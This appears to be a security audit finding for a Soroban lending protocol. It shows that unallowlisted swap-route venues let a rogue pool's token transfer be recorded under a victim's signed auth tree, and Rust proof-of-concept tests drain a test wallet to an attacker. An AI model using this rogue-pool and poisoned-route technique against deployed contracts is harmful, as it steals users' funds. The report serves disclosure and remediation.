### Title
Unsanitized route-nominated venue executes under the caller's auth tree, allowing a crafted swap payload to drain arbitrary wallet tokens - ([File: contracts/controller/src/strategies/swap.rs])

### Summary
CVE-2018-1265 is a failure to sanitize attacker-controlled path data inside an archive header, letting a crafted payload write/execute outside its intended boundary. The analog in XOXNO Lending is the swap-route payload: `swap_collateral`, `swap_debt`, `repay_debt_with_collateral` and `multiply` accept a fully caller-controlled `StrategySwap`/`Bytes` route, and the controller imposes no bound on which contracts the route names. The router dispatches hops to whatever pool address the payload contains, and none of the route's venue invocations are allowlisted. A pool contract named by a malicious route can call `token.transfer(victim, attacker, amount)` while executing inside the hop. Because the caller's `require_auth` for `swap_collateral`/`execute_strategy` is a tree whose recorded sub-invocations are produced by `simulateTransaction`, the rogue transfer is silently recorded as a legitimate child of the signed entry — the victim's signature then authorizes the theft. The harness proves both halves: recording mode attaches `transfer(alice, attacker, 77_770_000_000)` to Alice's `swap_collateral` entry and drains her wallet in `simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry`; enforcing mode accepts exactly that signed tree in `enforced_auth_moves_the_wallet_token_only_when_the_signed_tree_lists_the_rogue_transfer` [1](#0-0) .

### Finding Description
`swap_tokens` in `contracts/controller/src/strategies/swap.rs` authorizes exactly one `token_in.transfer(controller, router, amount_in)` and measures controller balance deltas, but the `swap: &StrategySwap` payload is passed to the router uninspected [2](#0-1) . Per the router's documented model, "the router's own self-authorization" covers venue pulls, while venues themselves are unallowlisted — any contract address can be a hop target, and nothing in `dispatch_hop` constrains what that contract does beyond measured `token_in`/`token_out` deltas of the router [3](#0-2) . A rogue hop contract can therefore invoke `token.transfer(victim, attacker, x)`. The host enforces the victim's auth tree, but simulation records the rogue transfer as a child of the caller's signed `swap_collateral` invocation, so standard wallet/frontend flows that sign the simulated tree approve the drain. The router's measured-output and residual checks only bound the router's own balances — they cannot see a transfer from the caller's wallet of a token the route never touches (`WALLET_BALANCE` of an unlisted token in the test).

### Impact Explanation
Theft of user funds. A crafted route payload drains any token in the victim's wallet — including assets the protocol never listed — under the victim's own signature on a routine `swap_collateral`/`execute_strategy`. The controller's exact-amount input authorization gives a false sense of containment: it bounds the router's pull of `token_in` but not sibling sub-invocations recorded under the same auth root.

### Likelihood Explanation
A single unprivileged address can produce the malicious route XDR and the rogue pool contract; distribution only requires the victim to execute a strategy with that payload (e.g., a route returned by a malicious quote source). Enforcing mode confirms the host accepts the poisoned tree once simulated, and no on-chain component inspects venue identities. Requires user action and a malicious payload, so it is not unilateral, but the theft is deterministic once the signed tree contains the recorded transfer.

### Recommendation
- Allowlist route venues/pools at the controller or router level so a hop can only dispatch to governance-approved contracts, or
- Pin the auth surface: have the controller call the router via a dedicated invoker path that cannot record foreign `transfer` sub-invocations under the caller's entry (e.g., execute strategies through a contract `sender` rather than the EOA's auth tree), and
- Surface a warning/invariant: reject route payloads whose recorded auth tree contains sub-invocations beyond the expected `token_in` pull and `swap_collateral` root (INV-STRAT-01 analogue extended to the caller's tree, not just the controller's).

### Proof of Concept
Reproduced by `tests/test-harness/tests/controller/../strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs`:

1. Attacker deploys `RogueHopPool` with plan `(victim=alice, wallet_token, to=attacker, amount)` and embeds its address as `hop_pool` in a `RoutedSwap` payload for `swap_collateral(alice, account, USDC, amount_in, ETH, route)` [4](#0-3) .
2. Simulation records `token.transfer(alice, attacker, WALLET_BALANCE)` as a sub-invocation of Alice's `swap_collateral` auth entry; Alice's wallet token balance goes to zero while the swap pays a fair output [5](#0-4) .
3. In enforcing mode the honest root-only tree is refused (`Unauthorized function call for address`), but the simulated poisoned tree — what a wallet would produce — authorizes the transfer and completes the swap [6](#0-5) .

#[test]
fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
}

#[test]
fn enforced_auth_moves_the_wallet_token_only_when_the_signed_tree_lists_the_rogue_transfer() {
    let s = Scene::new();

    // Control: a pool that touches nothing passes with the honest root-only tree.
    let benign = s.route_through_pool_stealing(0);
    s.try_swap_with_signed_tree(&benign, &[])
        .expect("the honest tree authorizes an honest route");
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);

    // Rogue pool, honest tree: the host refuses the transfer and the whole call rolls back.
    s.t.env.mock_all_auths_allowing_non_root_auth();
    let rogue = s.route_through_pool_stealing(WALLET_BALANCE);
    let usdc_before = s.t.supply_balance_raw(ALICE, "USDC");
    let refused = s
        .try_swap_with_signed_tree(&rogue, &[])
        .expect_err("a transfer outside the signed tree is unauthorized");
    std::println!("rogue transfer under the honest tree = {refused:?}");
    assert!(
        refused.is_type(ScErrorType::Auth) || refused.is_type(ScErrorType::Context),
        "expected a host auth failure, got {refused:?}"
    );
    assert!(s
        .diagnostics()
        .contains("Unauthorized function call for address"));
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);
    assert_eq!(s.wallet(&s.attacker), 0);
    assert_eq!(s.t.supply_balance_raw(ALICE, "USDC"), usdc_before);

    // Same route, with the tree that simulation returned.
    let stolen_transfer = MockAuthInvoke {
        contract: &s.wallet_token,
        fn_name: "transfer",
        args: (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        sub_invokes: &[],
    };
    s.try_swap_with_signed_tree(&rogue, core::slice::from_ref(&stolen_transfer))
        .expect("the poisoned tree authorizes the rogue transfer");
    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
}

## Authorization model

The only signature is the sender's. `execute_strategy` calls `sender.require_auth()`, and the sender's auth entry must cover the nested `token_in.transfer(sender, router, total_in)`; simulation produces that tree (`transaction.simulated = true` envelopes already carry it — `attach_simulated_transaction` copies the simulator's `auth` into the op — and `simulateTransaction` produces it for a locally built one). Do **not** `transfer` or `approve` tokens to the router beforehand: the router pulls the input itself, and tokens sent ahead of time are not credited.

Every venue call is self-authorized by the router with invoker-contract auth (`venues/auth.rs::authorize_as_current` → `env.authorize_as_current_contract`): Phoenix and Sushi (`HopContext::authorize_pool_pull`) and Aquarius (`aquarius/pool.rs::invoke_pool_swap`) register `token_in.transfer(router, pool, amount_in)` before the pool pulls; Comet registers `token_in.approve(router, pool, amount_in, expiry)`, then `swap_exact_amount_in` with a nested entry for the pool's `transfer_from`, then clears the allowance; Soroswap transfers from the router to the pool directly. None of these appear in the sender's auth tree.
